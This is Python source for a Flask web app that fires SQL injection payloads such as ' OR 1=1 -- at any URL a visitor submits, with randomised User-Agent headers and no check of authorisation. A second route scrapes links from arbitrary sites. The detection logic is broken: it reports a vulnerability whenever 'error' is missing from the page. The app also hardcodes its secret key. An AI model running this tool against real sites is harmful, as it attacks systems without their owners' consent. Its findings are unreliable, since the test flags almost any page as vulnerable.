import requests
from bs4 import BeautifulSoup
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
from flask import Flask, render_template, request, abort, session
from flask_session import Session
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField
from wtforms.validators import DataRequired, URL

# Create the Flask app
app = Flask(__name__)

# Set the app configuration
app.config['SECRET_KEY'] = 'mysecretkey'
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_PERMANENT'] = False
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'

# Initialize Flask-Session
Session(app)

# Define the website form using Flask-WTF
class WebsiteForm(FlaskForm):
    website = StringField('Website', validators=[DataRequired(), URL()])
    submit = SubmitField('Submit')

# Define the index route
@app.route('/', methods=['GET', 'POST'])
def index():
    # Instantiate the website form
    form = WebsiteForm()
    # If the form has been submitted and is valid
    if form.validate_on_submit():
        # Get the website URL from the form data
        website = form.website.data
        # Define the payloads to test for SQL injection
        payloads = ["' OR 1=1 --", "1' OR '1'='1", "admin'--"]
        # Define the headers to use for the HTTP request
        headers = {'User-Agent': UserAgent().get_random_user_agent()}
        # Create an empty list to store the results
        results = []
        # Test each payload for SQL injection vulnerability
        for payload in payloads:
            r = requests.get(website + "?username=" + payload + "&password=test", headers=headers)
            if "error" not in r.text.lower():
                results.append("SQL injection vulnerability found with payload: " + payload)
        # Render the template with the form and results
        return render_template('index.html', form=form, results=results)
    # If the form has not been submitted or is invalid
    return render_template('index.html', form=form)

# Define the scrape route
@app.route('/scrape', methods=['POST'])
def scrape():
    # If the user is logged in
    if 'logged_in' in session and session['logged_in']:
        # Get the website URL from the form data
        website = request.form['website']
        # Define the headers to use for the HTTP request
        headers = {'User-Agent': UserAgent().get_random_user_agent()}
        # Send an HTTP request to the website and parse the HTML response with BeautifulSoup
        r = requests.get(website, headers=headers)
        soup = BeautifulSoup(r.text, 'html.parser')
        # Extract all the links from the HTML response and store them in a list
        links = []
        for link in soup.find_all('a'):
            links.append(link.get('href'))
        # Render the template with the list of links
        return render_template('scrape.html', links=links)
